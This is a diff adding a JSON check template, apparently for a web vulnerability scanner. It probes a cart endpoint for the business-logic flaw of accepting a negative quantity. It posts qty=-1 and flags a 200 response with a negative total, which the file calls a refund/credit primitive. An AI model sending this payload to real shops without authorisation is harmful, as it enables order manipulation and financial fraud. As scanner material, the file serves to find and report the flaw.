@@ -1,0 +1,36 @@
+{
+  "name": "web/Negative quantity accepted in cart totals",
+  "description": "[high] Proves broken server-side validation of business constraints: qty=-1 is accepted and the server COMPUTES a negative total = refund/credit primitive without any refund flow (CWE-840, OWASP A04). Keywords: business logic negative quantity cart total validation order manipulation. ctrl: server-side validation rejects with 400 -> not falsified. base_url = cart line-item update endpoint.",
+  "cwe": "CWE-840",
+  "requests": {
+    "payload": {
+      "method": "POST",
+      "url": "{{base_url}}/cart/items",
+      "headers": {
+        "Content-Type": "application/json"
+      },
+      "body": "{\"sku\":\"sku-1\",\"qty\":-1}"
+    }
+  },
+  "conditions": [
+    {
+      "type": "status",
+      "request": "payload",
+      "equals": 200
+    },
+    {
+      "type": "body_regex",
+      "request": "payload",
+      "pattern": "\"total\"\\s*:\\s*-\\d",
+      "present": true
+    }
+  ],
+  "params": [
+    "base_url"
+  ],
+  "source": "imported",
+  "successes": 1,
+  "id": "37a901034cda",
+  "created": "2026-11-06T04:51:35.422905+00:00",
+  "last_used": "2026-11-06T04:51:35.422905+00:00"
+}
